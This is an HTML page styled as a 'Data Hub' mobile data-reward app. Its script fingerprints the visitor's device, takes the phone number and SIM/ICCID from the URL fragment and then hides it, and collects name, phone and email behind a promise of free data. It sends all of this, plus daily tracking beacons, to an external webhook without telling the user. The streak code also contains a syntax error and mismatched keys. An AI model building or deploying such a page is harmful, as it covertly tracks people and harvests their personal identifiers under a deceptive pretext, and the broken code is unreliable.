<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Data Hub</title>
  <link rel="manifest" href="https://progressier.app/p6Wd3th1GgmCpswqBNKU/progressier.json">
  <script defer src="https://progressier.app/p6Wd3th1GgmCpswqBNKU/script.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <style>
    body { margin:0; font-family:system-ui,sans-serif; background:#f8f9fa; }
    .topbar { background:#0b84ee; color:white; padding:20px; text-align:center; }
    .topbar h1 { margin:0; font-size:28px; font-weight:bold; }
    .swipe { font-size:20px; margin-top:8px; }
    .confirmed { text-align:center; padding:16px; font-size:18px; font-weight:bold; color:#0b84ee; background:#e3f2fd; margin:0; }
    .section { background:white; padding:24px; border-radius:16px; margin:20px; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.08); }
    h3 { color:#0b84ee; margin:0 0 12px 0; }
    #streak-text { font-size:42px; font-weight:bold; color:#28a745; margin:12px 0; }
    .bar-bg { background:#e0e0e0; border-radius:14px; height:28px; overflow:hidden; margin:16px 0; }
    #streak-bar { background:#28a745; height:100%; width:14.28%; transition:width 0.8s ease; }
    .prompt { background:#e3f2fd; padding:25px; border-radius:16px; margin:20px; text-align:center; display:none; }
    input { width:100%; padding:14px; margin:10px 0; border-radius:12px; border:1px solid #ccc; font-size:16px; box-sizing:border-box; }
    button { background:#0d6efd; color:white; padding:16px; border:none; border-radius:50px; font-weight:bold; font-size:18px; width:100%; margin-top:10px; }
    a.button { display:block; background:#0d6efd; color:white; padding:18px; border-radius:50px; text-decoration:none; font-weight:bold; font-size:18px; margin:20px; }
  </style>
</head>
<body>

<!-- TOP BAR -->
<div class="topbar">
  <h1>DATA HUB</h1>
  <div class="swipe">Swipe down for check-in ✓</div>
</div>

<div class="confirmed">Confirmed ✓</div>

<!-- STREAK COUNTER -->
<div class="section">
  <h3>Your Weekly Streak</h3>
  <div id="streak-text">Day 1</div>
  <div class="bar-bg"><div id="streak-bar"></div></div>
  <p id="streak-reward">Open 7 days in a row for 1 GB free data!</p>
</div>

<!-- ONE-TIME PROMPT WITH FIRST/LAST NAME -->
<div id="first-time-prompt" class="prompt">
  <h3>Quick One-Time Setup</h3>
  <p>Confirm your info for alerts and rewards!</p>
  <input type="text" id="first-name" placeholder="First name">
  <input type="text" id="last-name" placeholder="Last name">
  <input type="tel" id="phone" placeholder="Phone number">
  <input type="email" id="email" placeholder="Email (optional)">
  <button id="save">Save & Continue</button>
</div>

<!-- CHECK DATA BUTTON -->
<div class="section">
  <h3>Check Your Remaining Data</h3>
  <a href="intent:#Intent;action=android.settings.DATA_USAGE_SETTINGS;end" class="button">
    Open Data Usage ➜
  </a>
</div>

<script>
// FULL APP LOGIC
FingerprintJS.load().then(fp => {
  fp.get().then(result => {
    const deviceId = result.visitorId;
    localStorage.setItem('device_fingerprint', deviceId);

    // Phone + SIM from #hash
    let userPhone = localStorage.getItem('user_phone');
    let userSim = localStorage.getItem('user_sim');
    if (!userPhone || !userSim) {
      const hash = window.location.hash.substring(1);
      if (hash) {
        const params = new URLSearchParams(hash);
        const phone = params.get('phone') || params.get('number');
        const sim = params.get('sim')   || params.get('simid') || params.get('iccid');
        if (phone) { userPhone = phone.replace(/[^0-9]/g,''); localStorage.setItem('user_phone', userPhone); }
        if (sim) { userSim = sim.toUpperCase(); localStorage.setItem('user_sim', userSim); }
        history.replaceState(null, null, window.location.pathname);
      }
    }

    // ONE-TIME PROMPT WITH FIRST/LAST NAME
    if (!localStorage.getItem('user_info_saved')) {
      document.getElementById('first-time-prompt').style.display = 'block';
    }
    document.getElementById('save')?.addEventListener('click', function() {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phone = document.getElementById('phone').value.replace(/[^0-9]/g,'');
      const email = document.getElementById('email').value.trim();
      if (phone.length >= 10 && firstName && lastName) {
        localStorage.setItem('user_first_name', firstName);
        localStorage.setItem('user_last_name', lastName);
        localStorage.setItem('user_phone_verified', phone);
        if (email) localStorage.setItem('user_email', email);
        localStorage.setItem('user_info_saved', 'true');

        // SEND PROMPT DATA TO MAKE.COM
        fetch('https://hook.us2.make.com/7ozrdbk7h2q1topau4u71v6y2b6u9bpm', {
          method: 'POST',
          body: JSON.stringify({
            device_id: deviceId,
            first_name: firstName,
            last_name: lastName,
            phone_verified: phone,
            email: email || 'none',
            t: new Date().toLocaleString("en-US", {timeZone: "America/New_York"}),
            p: 'user_info_submitted',
            s: 'data_hub'
          })
        });

        document.getElementById('first-time-prompt').style.display = 'none';
        alert('Saved! You’re all set.');
      } else {
        alert('Please fill in your name and a valid phone number');
      }
    });

    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const net = conn ? (conn.effectiveType || conn.type || 'unknown') : 'unknown';

    // STREAK
    const streakKey = 'weekly_streak_' + deviceId;
    let streak = parseInt(localStorage.getItem(streakKey)) || 0;
    const lastCheckDate = localStorage.getItem('lastCheckDate');
    const today = new Date().toDateString();
    if (!lastCheckDate || new Date(lastCheckDate).toDateString() !== today) {
      streak = streak === 0 ? 1 : streak + 1;
      localStorage.setItem('streakKey', streak);
      localStorage.setItem('streakKey + '_date', today);
    }

    // VISUAL STREAK
    document.getElementById('streak-text').textContent = 'Day ' + streak;
    document.getElementById('streak-bar').style.width = Math.min((streak / 7) * 100, 100) + '%';
    if (streak >= 7) {
      document.getElementById('streak-reward').innerHTML = '<strong style="color:#28a745;">1 GB free data added!</strong>';
    }

    // Eastern Time
    const easternTime = new Date().toLocaleString("en-US", {timeZone: "America/New_York"});

    // Beacon
    function sendBeacon(page) {
      fetch('https://hook.us2.make.com/7ozrdbk7h2q1topau4u71v6y2b6u9bpm', {
        method: 'POST',
        body: JSON.stringify({
          device_id: deviceId,
          phone:     userPhone || 'unknown',
          sim_id:    userSim   || 'unknown',
          t:         easternTime,
          p:         page,
          s:         'data_hub',
          ua:        navigator.userAgent,
          o:         navigator.onLine,
          n:         net,
          streak:    streak
        })
      });
    }

    sendBeacon('monthly_checkin');

    const lastPing = localStorage.getItem('last_ping') || 0;
    if (Date.now() - lastPing > 23*60*60*1000) {
      sendBeacon('daily_ping');
      localStorage.setItem('last_ping', Date.now());
    }
  });
});
</script>

</body>
</html>
